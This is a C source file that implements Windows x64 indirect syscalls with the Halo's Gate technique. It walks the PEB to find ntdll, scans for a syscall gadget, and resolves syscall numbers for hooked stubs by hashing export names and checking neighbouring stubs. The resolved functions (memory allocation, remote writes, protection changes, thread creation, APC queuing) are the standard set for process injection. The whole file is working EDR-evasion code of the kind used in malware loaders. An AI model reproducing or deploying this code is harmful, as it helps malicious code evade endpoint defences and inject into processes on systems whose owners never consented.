#include "syscalls.h"
#include <winternl.h>

typedef struct _HASH_ENTRY {
    DWORD   hash;
    PSYSCALL_ENTRY dest;
} HASH_ENTRY;

static PVOID find_syscall_gadget(PBYTE ntdll_base, DWORD ntdll_size) {
    for (DWORD i = 0; i < ntdll_size - 2; i++) {
        if (ntdll_base[i] == 0x0F && ntdll_base[i + 1] == 0x05 && ntdll_base[i + 2] == 0xC3)
            return &ntdll_base[i];
    }
    return NULL;
}

static BOOL is_stub_clean(PBYTE func) {
    // Clean Nt stub pattern on x64:
    //   4C 8B D1          mov r10, rcx
    //   B8 xx xx 00 00    mov eax, SSN
    return (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1 && func[3] == 0xB8);
}

static DWORD extract_ssn(PBYTE func) {
    return *(DWORD*)(func + 4);
}

static BOOL resolve_ssn_halo(PBYTE func, DWORD* out_ssn) {
    if (is_stub_clean(func)) {
        *out_ssn = extract_ssn(func);
        return TRUE;
    }

    // Halo's Gate: stub is hooked, walk neighbors to find clean stubs
    // Neighbor stubs are typically 0x20 (32) bytes apart
    for (WORD i = 1; i < 500; i++) {
        // Check downward neighbor
        PBYTE down = func + (i * 0x20);
        if (is_stub_clean(down)) {
            *out_ssn = extract_ssn(down) - i;
            return TRUE;
        }
        // Check upward neighbor
        if ((ULONG_PTR)(func - (i * 0x20)) > (ULONG_PTR)func)
            continue; // underflow guard
        PBYTE up = func - (i * 0x20);
        if (is_stub_clean(up)) {
            *out_ssn = extract_ssn(up) + i;
            return TRUE;
        }
    }
    return FALSE;
}

BOOL sc_init(PSYSCALL_TABLE table) {
    // Get ntdll base from PEB
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    HMODULE ntdll_base = NULL;
    DWORD ntdll_size = 0;

    while (curr != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->FullDllName.Buffer) {
            // ntdll.dll is always the second module (after the exe)
            // Check for 'ntdll' in the name using a simple char scan
            PWCHAR name = entry->FullDllName.Buffer;
            DWORD len = entry->FullDllName.Length / sizeof(WCHAR);
            for (DWORD j = 0; j + 4 < len; j++) {
                if ((name[j] == L'n' || name[j] == L'N') &&
                    (name[j+1] == L't' || name[j+1] == L'T') &&
                    (name[j+2] == L'd' || name[j+2] == L'D') &&
                    (name[j+3] == L'l' || name[j+3] == L'L') &&
                    (name[j+4] == L'l' || name[j+4] == L'L')) {
                    ntdll_base = (HMODULE)entry->DllBase;
                    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)ntdll_base +
                        ((PIMAGE_DOS_HEADER)ntdll_base)->e_lfanew);
                    ntdll_size = nt->OptionalHeader.SizeOfImage;
                    goto found;
                }
            }
        }
        curr = curr->Flink;
    }
    return FALSE;

found:;
    PVOID gadget = find_syscall_gadget((PBYTE)ntdll_base, ntdll_size);
    if (!gadget)
        return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll_base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)ntdll_base + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdll_base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD names_rva  = (PDWORD)((PBYTE)ntdll_base + exports->AddressOfNames);
    PDWORD funcs_rva  = (PDWORD)((PBYTE)ntdll_base + exports->AddressOfFunctions);
    PWORD  ords       = (PWORD)((PBYTE)ntdll_base + exports->AddressOfNameOrdinals);

    HASH_ENTRY targets[] = {
        { H_NtAllocateVirtualMemory,    &table->NtAllocateVirtualMemory    },
        { H_NtWriteVirtualMemory,       &table->NtWriteVirtualMemory       },
        { H_NtProtectVirtualMemory,     &table->NtProtectVirtualMemory     },
        { H_NtCreateThreadEx,           &table->NtCreateThreadEx           },
        { H_NtQueueApcThread,           &table->NtQueueApcThread           },
        { H_NtResumeThread,             &table->NtResumeThread             },
        { H_NtWaitForSingleObject,      &table->NtWaitForSingleObject      },
        { H_NtClose,                    &table->NtClose                    },
        { H_NtOpenProcess,              &table->NtOpenProcess              },
        { H_NtTerminateProcess,         &table->NtTerminateProcess         },
        { H_NtQueryInformationProcess,  &table->NtQueryInformationProcess  },
        { H_NtFreeVirtualMemory,        &table->NtFreeVirtualMemory        },
    };
    DWORD target_count = sizeof(targets) / sizeof(targets[0]);
    DWORD resolved = 0;

    for (DWORD i = 0; i < exports->NumberOfNames && resolved < target_count; i++) {
        const char* name = (const char*)((PBYTE)ntdll_base + names_rva[i]);
        if (name[0] != 'N' || name[1] != 't')
            continue;

        DWORD h = djb2_hash(name);
        for (DWORD t = 0; t < target_count; t++) {
            if (targets[t].hash == h) {
                PBYTE func = (PBYTE)ntdll_base + funcs_rva[ords[i]];
                DWORD ssn;
                if (!resolve_ssn_halo(func, &ssn))
                    return FALSE;
                targets[t].dest->ssn = ssn;
                targets[t].dest->gadget = gadget;
                resolved++;
                break;
            }
        }
    }

    return (resolved == target_count);
}
